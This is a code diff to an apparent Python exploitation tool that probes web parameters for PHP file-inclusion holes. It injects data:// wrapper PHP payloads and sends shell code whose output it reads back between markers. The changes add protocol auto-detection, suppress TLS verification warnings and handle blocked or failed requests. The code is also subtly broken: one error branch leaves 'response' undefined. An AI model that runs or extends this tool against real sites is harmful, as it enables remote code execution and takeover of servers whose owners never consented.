@@ -10,11 +10,14 @@ from rich.console import Console
 from prompt_toolkit import PromptSession
 from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.history import InMemoryHistory
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class DataChecker:
     def __init__(self, url, silent=False):
         self.console = Console()
-        self.url = url
+        self.url = self.ensure_correct_protocol(url)
         self.silent = silent
         self.random_string = self._generate_random_string()
         self.random_string_base64 = base64.b64encode(self.random_string.encode()).decode()
@@ -22,6 +25,19 @@ class DataChecker:
             f'data://text/plain,<?php echo "{self.random_string_base64}"; ?>',
         ]
 
+    def ensure_correct_protocol(self, url):
+        if not url.startswith(('http://', 'https://')):
+            try:
+                requests.get('https://' + url, timeout=3, verify=False)
+                return 'https://' + url
+            except requests.exceptions.RequestException:
+                try:
+                    requests.get('http://' + url, timeout=3, verify=False)
+                    return 'http://' + url
+                except requests.exceptions.RequestException:
+                    pass
+        return url
+    
     def _generate_random_string(self, length=10):
         return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
@@ -50,7 +66,12 @@ class DataChecker:
                 new_params[param_name] = payload
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                response = requests.get(fuzzed_url, verify=False)
+                
+                try:
+                    response = requests.get(fuzzed_url, verify=False)
+                except requests.exceptions.ConnectionError:
+                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                    return False, None    
 
                 if payload_regex.search(response.text):
                     if not self.silent:
@@ -91,7 +112,12 @@ class DataChecker:
                 new_params[param_name] = shell_code
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                response = requests.get(fuzzed_url)
+                
+                try:
+                    response = requests.get(fuzzed_url, verify=False)
+                except requests.exceptions.ConnectionError:
+                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                    
                 pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                 response_content = pattern.search(response.text)
                 if response_content:
